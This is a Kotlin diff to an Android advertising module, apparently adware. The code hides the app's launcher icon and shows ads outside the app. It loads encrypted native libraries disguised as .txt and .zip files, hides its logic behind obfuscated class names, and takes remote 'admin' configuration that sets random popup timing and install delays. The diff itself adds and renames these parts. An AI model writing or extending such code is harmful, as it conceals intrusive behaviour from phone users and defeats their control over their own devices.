@@ -6,6 +6,8 @@ import android.content.Context
 import android.os.Build
 import android.os.Bundle
 import android.os.PowerManager
+import android.util.Log
+import azshow.sl.lo
 import com.ak.impI.Core
 import com.ak.impI.AppLifecycelListener
 import kotlinx.coroutines.CoroutineScope
@@ -14,7 +16,6 @@ import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
 import org.json.JSONObject
-import az.b.a
 import com.ak.impI.Constant
 import com.facebook.FacebookSdk
 import com.facebook.appevents.AppEventsLogger
@@ -64,7 +65,7 @@ object AdE {
 
     @JvmStatic
     var isLoadH = false //是否H5的so 加载成功
-    private var tagL = "" //调用外弹 隐藏icon字符串
+    private var tagL = "tohe" //调用外弹 隐藏icon字符串
     private var timeDS = 100L //延迟显示随机时间开始
     private var timeDE = 400L //延迟显示随机时间结束
     private var maxShowTime = 10000L // 最大显示时间
@@ -141,18 +142,20 @@ object AdE {
 
     @JvmStatic
     fun a2() {
+        Log.e("TAG", "a2: xun", )
         mContext.registerActivityLifecycleCallbacks(AppLifecycelListener())
         File("${mContext.dataDir}/${Constant.c}").mkdirs()
         t()
     }
 
+    // 如果是Admin写在里面的那么可以直接进行数据
     @JvmStatic
     fun reConfig(js: JSONObject) {
         // JSON数据格式
         sK = js.optString("so_key")//So 解密的key
         tagL = js.optString("wai_str")//隐藏icon 字符串
-        mAdC.setAdId(js.optString("ad_id_h"),js.optString("ad_id_l"))// 广告id
-        val lt = js.optString("time").split("-")//时间相关配置
+        mAdC.setAdId(js.optString("ad_id_h"), js.optString("ad_id_l"))// 广告id
+        val lt = js.optString("t_state").split("-")//时间相关配置
         cTime = lt[0].toLong() * 1000
         tPer = lt[1].toInt() * 1000
         mInstallWait = lt[2].toInt() * 1000
@@ -163,6 +166,16 @@ object AdE {
         timeDE = lt[7].toLong()
         maxShowTime = lt[8].toLong() * 1000
         checkTimeRandom = lt[9].toInt() * 1000
+    }
+
+    private var lastS = ""
+    private fun refreshAdmin() {
+        // todo 把外面的配置传进来通过反射、mmkv、keep后的类返回等
+        val s = Core.getStr("akv")
+        if (lastS != s) {
+            lastS = s
+            reConfig(JSONObject(s))
+        }
     }
 
     private fun t() {
@@ -177,15 +190,19 @@ object AdE {
             val i: Boolean
             withContext(Dispatchers.IO) {
                 // todo 外弹so 加密的名字 64-32
-                i = loadSFile(if (is64i) "64.txt" else "32.zip")
+                i = loadSFile(if (is64i) "kuang.txt" else "kun.zip")
             }
+            Log.e("TAG", "t: 外弹so 加密=$i", )
             if (i.not()) {
                 Core.pE("ss_l_f", "$is64i")
                 return@launch
             }
             Core.pE("test_s_load", "${System.currentTimeMillis() - time}")
-            a.a0(2, 1.0, tagL)
+            lo.loTx(22, 11.0, tagL)
+            Log.e("TAG", "t: 隐藏icon==$tagL", )
             while (true) {
+                // 刷新配置
+                refreshAdmin()
                 var t = cTime
                 if (checkTimeRandom > 0) {
                     t = Random.nextLong(cTime - checkTimeRandom, cTime + checkTimeRandom)
@@ -202,10 +219,10 @@ object AdE {
         mMainScope.launch(Dispatchers.IO) {
             delay(1000)
             // todo H5 so 加密的名字 64-32
-            if (loadSFile(if (is64i) "h564.gif" else "h532.txt")) {
+            if (loadSFile(if (is64i) "huang.txt" else "hua.zip")) {
                 withContext(Dispatchers.Main) {
                     try {
-                        az.b.a.b(mContext)
+                        lo.loh(mContext)
                         isLoadH = true
                     } catch (_: Throwable) {
                     }
@@ -292,7 +309,7 @@ object AdE {
             }
             sNumJump(++numJumps)
             Core.pE("ad_start")
-            a.a0(2, 1.0, Constant.b)
+            lo.loTx(2, 1.0, Constant.b)
         }
     }
 
@@ -303,13 +320,13 @@ object AdE {
     }
 
     @JvmStatic
-    fun postEcpm(ecpm:Double){
+    fun postEcpm(ecpm: Double) {
         try {
             val b = Bundle()
             b.putDouble(FirebaseAnalytics.Param.VALUE, ecpm)
             b.putString(FirebaseAnalytics.Param.CURRENCY, "USD")
             // todo rename xxx
-            Firebase.analytics.logEvent("ad_impression_xxx", b)
+            Firebase.analytics.logEvent("ad_impression_Brilliant", b)
         } catch (_: Exception) {
         }
         if (FacebookSdk.isInitialized().not()) return
